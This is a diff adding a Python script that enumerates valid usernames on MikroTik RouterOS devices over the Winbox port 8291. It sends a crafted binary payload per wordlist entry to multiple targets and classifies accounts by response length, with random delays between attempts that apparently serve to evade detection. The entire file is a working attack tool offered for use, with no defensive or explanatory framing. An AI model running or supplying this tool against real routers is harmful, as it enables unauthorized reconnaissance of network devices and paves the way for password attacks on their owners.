@@ -1,0 +1,89 @@
+import socket
+import asyncio
+import struct
+import random
+
+def read_wordlist(file_path):
+    try:
+        with open(file_path, "r") as file:
+            return [line.strip() for line in file if line.strip()]
+    except Exception as e:
+        print(f"Error reading wordlist: {e}")
+        return []
+
+def create_payload(base_payload, username):
+    length = len(username)
+    first_byte = struct.pack("B", 0x22 + length) 
+    return first_byte + base_payload[1:2] + username.encode() + base_payload[2:]
+
+def process_response(response):
+    response_length = len(response)
+    if response_length == 51:
+        return "valid"
+    elif response_length == 35:
+        return "invalid"
+    else:
+        return "unknown"
+
+async def scan_target(host, port, wordlist, base_payload):
+    print(f"Scanning {host}:{port}...")
+    valid_usernames = []
+
+    for username in wordlist:
+        try:
+            reader, writer = await asyncio.open_connection(host, port)
+        except Exception as e:
+            print(f"Error connecting to {host}:{port} for username {username}: {e}")
+            continue
+
+        payload = create_payload(base_payload, username)
+        print(f"Sending payload for username: {username}")
+        writer.write(payload)
+        await writer.drain()
+
+        try:
+            response = await asyncio.wait_for(reader.read(1024), timeout=5)
+            result = process_response(response)
+            if result == "valid":
+                valid_usernames.append(username)
+                print(f"Valid username found: {username}")
+            elif result == "invalid":
+                print(f"Invalid username: {username}")
+        except asyncio.TimeoutError:
+            print(f"Timeout waiting for response for username: {username}")
+
+        writer.close()
+        await writer.wait_closed()
+
+        await asyncio.sleep(random.randint(1, 3))
+
+    return valid_usernames
+
+async def main(targets, port, wordlist_path):
+    wordlist = read_wordlist(wordlist_path)
+    if not wordlist:
+        print("Wordlist is empty or could not be loaded.")
+        return
+
+    base_payload = b"\x22\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+    tasks = []
+    for target in targets:
+        tasks.append(scan_target(target, port, wordlist, base_payload))
+
+    results = await asyncio.gather(*tasks)
+    for i, result in enumerate(results):
+        print(f"Results for {targets[i]}: {', '.join(result) if result else 'No valid usernames found'}")
+
+if __name__ == "__main__":
+    import sys
+
+    if len(sys.argv) < 3:
+        print("Usage: python mikrotik_routeros_userenum_wordlist.py <wordlist_path> <target1,target2,...>")
+        sys.exit(1)
+
+    wordlist_path = sys.argv[1]
+    targets = sys.argv[2].split(",")
+    port = 8291
+
+    asyncio.run(main(targets, port, wordlist_path))
